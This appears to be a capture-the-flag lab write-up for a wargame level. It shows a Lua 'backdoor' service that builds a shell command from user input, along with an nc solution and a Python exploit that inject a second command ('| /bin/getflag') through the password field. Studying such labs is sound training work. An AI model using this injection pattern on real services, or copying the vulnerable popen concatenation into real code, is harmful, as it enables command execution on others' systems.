# Level12

#### About

There is a backdoor process listening on port 50001. 
To do this level, log in as the level12 account with the password level12. Files for this level can be found in /home/flag12. 


#### Source Code

```
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password) 
	prog = io.popen("echo "..password.." | sha1sum", "r")
	data = prog:read("*all")
	prog:close()

	data = string.sub(data, 1, 40)

	return data
end


while 1 do
	local client = server:accept()
	client:send("Password: ")
	client:settimeout(60)
	local line, err = client:receive()
	if not err then
		print("trying " .. line) -- log from where ;\
		local h = hash(line)

		if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
			client:send("Better luck next time\n");
		else
			client:send("Congrats, your token is 413**CARRIER LOST**\n")
		end

	end

	client:close()
end
```


#### Solutions

```
nc -v 127.0.0.1 50001
test | /bin/getflag | tee /tmp/level12.txt
cat /tmp/level12.txt
```

#### Exploits

```
#!/usr/bin/env python

import socket

def exploit(host, port):
    tmpfile = "/tmp/7845.yxha"
    payload = "xxx | /bin/getflag > %s \n" % tmpfile
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)

    addr = (host, port)
    c.connect(addr)

    data = c.recv(1024)

    if 'Password' in data:
        print "[+] exploit %s\n%s" % (addr, payload)
        c.sendall(payload)
        # data = c.recv(1024)
        
        # print data

    c.close()


def main():
    exploit('127.0.0.1', 50001)

if __name__ == "__main__":
    main()
```
